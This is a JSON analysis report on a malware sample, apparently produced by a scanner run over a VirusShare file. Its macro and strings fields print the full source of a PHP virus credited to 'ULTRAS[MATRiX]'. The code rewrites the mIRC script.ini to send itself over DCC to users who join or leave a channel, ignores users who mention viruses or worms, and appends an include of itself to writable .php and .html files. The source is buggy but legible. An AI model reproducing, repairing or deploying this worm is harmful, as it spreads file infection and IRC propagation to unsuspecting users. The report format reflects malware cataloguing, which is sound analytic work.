{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "copyfile": "May copy a file",
            "mkdir": "May create a directory"
        },
        "macro": "<?php\n// PHP.Alf by ULTRAS[MATRiX]\n\n\n$phpdir = 'c:\\phpalf';\n$mircinf = 'c:\\mirc\\script.ini';\n\n$shom = true;\n\nif ( (file_exists($mircinf) )\n{\n  $script  = fopen($mircinf, \"r\");\n  $checks  = fread($script, filesize($mircinf);\n  $virz    = strstr($checks, 'script.php');\n    if (!$virz) $shom = false;\n\t\t\n      if ( ($shom=false) )\n{\n$unmirc = unlink($mircinf);\n$tomirc = touch($mircinf);\n\n$open_mirc = fopen($mircinf, \"a\");\n$fputs($open_mirc, \"[script]\");\n$fputs($open_mirc, \"n0; A.L.F script\");\n$fputs($open_mirc, \"n1; by ULTRAS[MATRiX]\");\n$fputs($open_mirc, \"n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }\");\n$fputs($open_mirc, \"n3=  /dcc send $nick c:\\phpalf\\script.php\");\n$fputs($open_mirc, \"n4=}\");\n$fputs($open_mirc, \"n5=ON 1:PART:#:{ /if ( $nick == $me ) { halt }\");\n$fputs($open_mirc, \"n6= /dcc send $nick c:\\phpalf\\script.php\");\n$fputs($open_mirc, \"n7=}\");\n$fputs($open_mirc, \"n8=on 1:QUIT:#:/msg $chan MTX4EVER\");\n$fputs($open_mirc, \"n9=on 1:TEXT:*virus*:#:/.ignore $nick\");\n$fputs($open_mirc, \"n10=on 1:TEXT:*virus*:?:/.ignore $nick\");\n$fputs($open_mirc, \"n11=on 1:TEXT:*worm*:#:/.ignore $nick\");\n$fputs($open_mirc, \"n12=on 1:TEXT:*worm*:?:/.ignore $nick\");\n$fputs($open_mirc, \"n13=on 1:TEXT:*php*:#:/.ignore $nick\");\n$fputs($open_mirc, \"n14=on 1:TEXT:*php*:?:/.ignore $nick\");\n$fputs($open_mirc, \"n15=on 1:TEXT:*script*:#:/.ignore $nick\");\n$fputs($open_mirc, \"n16=on 1:TEXT:*script*:?:/.ignore $nick\");\nreturn;\n\t}\n}\n fclose($mircinf);\n $shom = true;\n\n $createdir = mkdir($phpdir,0)\n $renamefile = rename(__FILE__, 'alf.php');\n $copyfile = copy(__FILE__, 'c:\\phpalf');\n $rename2 = rename('c:\\phpalf\\alf.php', 'script.php');\n\n\n$dirz = opendir('.');\nwhile ($alldir = readdir($dirz))\n{\n $inf_ = true;\n $ext_ = false;\n\n if ( ($ext_ = strstr ($alldir, '.php')) || ($ext_ = strstr ($alldir, '.html')) || ($ext_ = strstr ($alldir, '.htm')) )\n if ( is_file($alldir) && is_writeable($alldir) )\n{\n\t\t\n\t\t\n $opz = fopen($alldir, \"r\");\n $check = fread($opz, filesize($alldir));\n $sig_ = strstr ($check, 'alf.php');\n if (!$sig_) $inf_ = false;\n}\n\t\n if ( ($inf_=false) )\n\t{\n $opz = fopen($alldir, \"a\");\n $fputs($opz, \"<?php \");\n $fputs($opz, \"include(\\\"\");\n $fputs($opz, __FILE__);\n $fputs($opz, \"\\\"); \");\n $fputs($opz, \"?>\");\n  return;\n\t}\n}\nclosedir($dirz);"
    },
    "filename": "VirusShare_29648df60b0c134eb0c0dc289ccb4c05",
    "filesize": 2331,
    "filetype": "PHP script, ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "29648df60b0c134eb0c0dc289ccb4c05",
        "sha1": "3819243169aa8b7327750549d1a8b253ceebf79a",
        "sha256": "4662cdf1b8aed7da818a8e48531ca1f8b2b4c71359b39ae471e3e1db93ba3c32"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "// PHP.Alf by ULTRAS[MATRiX]",
            "$phpdir = 'c:\\phpalf';",
            "$mircinf = 'c:\\mirc\\script.ini';",
            "$shom = true;",
            "if ( (file_exists($mircinf) )",
            "  $script  = fopen($mircinf, \"r\");",
            "  $checks  = fread($script, filesize($mircinf);",
            "  $virz    = strstr($checks, 'script.php');",
            "    if (!$virz) $shom = false;",
            "      if ( ($shom=false) )",
            "$unmirc = unlink($mircinf);",
            "$tomirc = touch($mircinf);",
            "$open_mirc = fopen($mircinf, \"a\");",
            "$fputs($open_mirc, \"[script]\");",
            "$fputs($open_mirc, \"n0; A.L.F script\");",
            "$fputs($open_mirc, \"n1; by ULTRAS[MATRiX]\");",
            "$fputs($open_mirc, \"n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }\");",
            "$fputs($open_mirc, \"n3=  /dcc send $nick c:\\phpalf\\script.php\");",
            "$fputs($open_mirc, \"n4=}\");",
            "$fputs($open_mirc, \"n5=ON 1:PART:#:{ /if ( $nick == $me ) { halt }\");",
            "$fputs($open_mirc, \"n6= /dcc send $nick c:\\phpalf\\script.php\");",
            "$fputs($open_mirc, \"n7=}\");",
            "$fputs($open_mirc, \"n8=on 1:QUIT:#:/msg $chan MTX4EVER\");",
            "$fputs($open_mirc, \"n9=on 1:TEXT:*virus*:#:/.ignore $nick\");",
            "$fputs($open_mirc, \"n10=on 1:TEXT:*virus*:?:/.ignore $nick\");",
            "$fputs($open_mirc, \"n11=on 1:TEXT:*worm*:#:/.ignore $nick\");",
            "$fputs($open_mirc, \"n12=on 1:TEXT:*worm*:?:/.ignore $nick\");",
            "$fputs($open_mirc, \"n13=on 1:TEXT:*php*:#:/.ignore $nick\");",
            "$fputs($open_mirc, \"n14=on 1:TEXT:*php*:?:/.ignore $nick\");",
            "$fputs($open_mirc, \"n15=on 1:TEXT:*script*:#:/.ignore $nick\");",
            "$fputs($open_mirc, \"n16=on 1:TEXT:*script*:?:/.ignore $nick\");",
            "return;",
            " fclose($mircinf);",
            " $shom = true;",
            " $createdir = mkdir($phpdir,0)",
            " $renamefile = rename(__FILE__, 'alf.php');",
            " $copyfile = copy(__FILE__, 'c:\\phpalf');",
            " $rename2 = rename('c:\\phpalf\\alf.php', 'script.php');",
            "$dirz = opendir('.');",
            "while ($alldir = readdir($dirz))",
            " $inf_ = true;",
            " $ext_ = false;",
            " if ( ($ext_ = strstr ($alldir, '.php')) || ($ext_ = strstr ($alldir, '.html')) || ($ext_ = strstr ($alldir, '.htm')) )",
            " if ( is_file($alldir) && is_writeable($alldir) )",
            " $opz = fopen($alldir, \"r\");",
            " $check = fread($opz, filesize($alldir));",
            " $sig_ = strstr ($check, 'alf.php');",
            " if (!$sig_) $inf_ = false;",
            " if ( ($inf_=false) )",
            " $opz = fopen($alldir, \"a\");",
            " $fputs($opz, \"<?php \");",
            " $fputs($opz, \"include(\\\"\");",
            " $fputs($opz, __FILE__);",
            " $fputs($opz, \"\\\"); \");",
            " $fputs($opz, \"?>\");",
            "  return;",
            "closedir($dirz);"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.265137",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
